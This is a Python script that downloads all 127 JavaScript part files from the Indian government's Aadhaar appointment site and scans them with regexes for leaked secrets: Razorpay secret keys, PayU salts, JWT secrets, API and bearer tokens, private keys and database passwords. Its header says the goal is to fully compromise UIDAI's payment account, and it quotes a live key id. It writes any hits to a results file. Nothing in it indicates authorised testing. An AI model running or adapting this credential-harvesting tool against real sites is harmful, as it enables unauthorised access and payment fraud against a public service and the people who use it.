"""
Target: Find Razorpay SECRET key in all Dart JS parts
The key_id (rzp_live_OJAxlTzJErna95) is the public half.
The key_secret is the PRIVATE half - if found, UIDAI's Razorpay account is fully compromised.
Also hunt for: JWT secrets, API tokens, private keys, passwords
"""
import requests
import re
import warnings
warnings.filterwarnings('ignore')

BASE = "https://bookappointment.uidai.gov.in"

# ALL 127 part files - download every single one
ALL_PARTS = [f"main.dart.js_{i}.part.js" for i in range(1, 128)]

# Highly specific patterns for secrets (not noise)
SECRET_PATTERNS = {
    "RAZORPAY_SECRET": [
        re.compile(r'rzp_live_[A-Za-z0-9]{14}["\'][\s,]*["\']([A-Za-z0-9]{20,})["\']'),
        re.compile(r'key_secret["\']?\s*[:=,]\s*["\']([A-Za-z0-9]{20,})["\']'),
        re.compile(r'([A-Za-z0-9]{20,})["\'][\s,]*["\']rzp_live_'),
        re.compile(r'rzp["\']?\s*:\s*\{[^}]*secret["\']?\s*:\s*["\']([A-Za-z0-9]{15,})["\']'),
    ],
    "PAYU_SALT": [
        re.compile(r'(?:salt|merchant_salt|key_salt)["\']?\s*[:=]\s*["\']([A-Za-z0-9]{10,})["\']', re.IGNORECASE),
        re.compile(r'(?:payu|PayU)[^"\']{0,50}salt[^"\']{0,20}["\']([A-Za-z0-9]{10,})["\']', re.IGNORECASE),
    ],
    "PAYU_MERCHANT_KEY": [
        re.compile(r'merchant_key["\']?\s*[:=]\s*["\']([A-Za-z0-9]{5,20})["\']', re.IGNORECASE),
    ],
    "JWT_SECRET": [
        re.compile(r'(?:jwt|jwtSecret|jwt_secret|secretKey|secret_key)["\']?\s*[:=]\s*["\']([A-Za-z0-9+/=_\-]{16,})["\']', re.IGNORECASE),
        re.compile(r'HS256[^"\']{0,50}["\']([A-Za-z0-9+/=_\-]{16,})["\']'),
    ],
    "API_KEY_GENERIC": [
        re.compile(r'(?:apiKey|api_key|APIKey|API_KEY)["\']?\s*[:=]\s*["\']([A-Za-z0-9\-_]{16,})["\']'),
        re.compile(r'X-API-Key["\']?\s*[:=]\s*["\']([A-Za-z0-9\-_]{16,})["\']'),
    ],
    "BEARER_TOKEN_HARDCODED": [
        re.compile(r'Authorization["\']?\s*[:=]\s*["\']Bearer\s+([A-Za-z0-9\-_.]{20,})["\']'),
        re.compile(r'Bearer\s+([A-Za-z0-9\-_=.]{30,})'),
    ],
    "PRIVATE_KEY": [
        re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
    ],
    "DB_PASSWORD": [
        re.compile(r'(?:db_pass|dbpassword|database_password|db\.password)["\']?\s*[:=]\s*["\']([^"\']{6,30})["\']', re.IGNORECASE),
    ],
    "UIDAI_INTERNAL_TOKEN": [
        re.compile(r'(?:uidai|UIDAI)[^"\']{0,30}(?:token|key|secret|password)[^"\']{0,20}["\']([A-Za-z0-9+/=\-_]{16,})["\']', re.IGNORECASE),
    ],
}

print("=" * 70)
print("RAZORPAY SECRET HUNTER — All 127 Dart JS Parts")
print("=" * 70)

all_secrets_found = {}

for part_file in ALL_PARTS:
    url = f"{BASE}/{part_file}"
    try:
        r = requests.get(url, timeout=20, headers={'User-Agent': 'Mozilla/5.0'})
        if r.status_code != 200:
            continue
        content = r.text

        for secret_type, patterns in SECRET_PATTERNS.items():
            for pattern in patterns:
                matches = pattern.findall(content)
                for match in matches:
                    val = match if isinstance(match, str) else match[0]
                    val = val.strip()
                    if len(val) < 8:
                        continue
                    # Exclude obvious false positives
                    if val in ['undefined', 'null', 'true', 'false', 'function', 'return']:
                        continue
                    key = f"{secret_type}:{val}"
                    if key not in all_secrets_found:
                        all_secrets_found[key] = part_file
                        print(f"\n[!!!] FOUND {secret_type} in {part_file}:")
                        print(f"      Value: {val}")
    except Exception:
        pass

print(f"\n{'='*70}")
print(f"SECRET HUNT COMPLETE — {len(all_secrets_found)} secrets found")
print(f"{'='*70}")

with open("secret_hunt_results.txt", "w", encoding="utf-8") as f:
    f.write("UIDAI Dart JS Secret Hunt Results\n" + "="*60 + "\n\n")
    for key, source in all_secrets_found.items():
        secret_type, value = key.split(":", 1)
        f.write(f"[{secret_type}]\n")
        f.write(f"  Value: {value}\n")
        f.write(f"  Found in: {source}\n\n")

print("[+] Results saved to secret_hunt_results.txt")
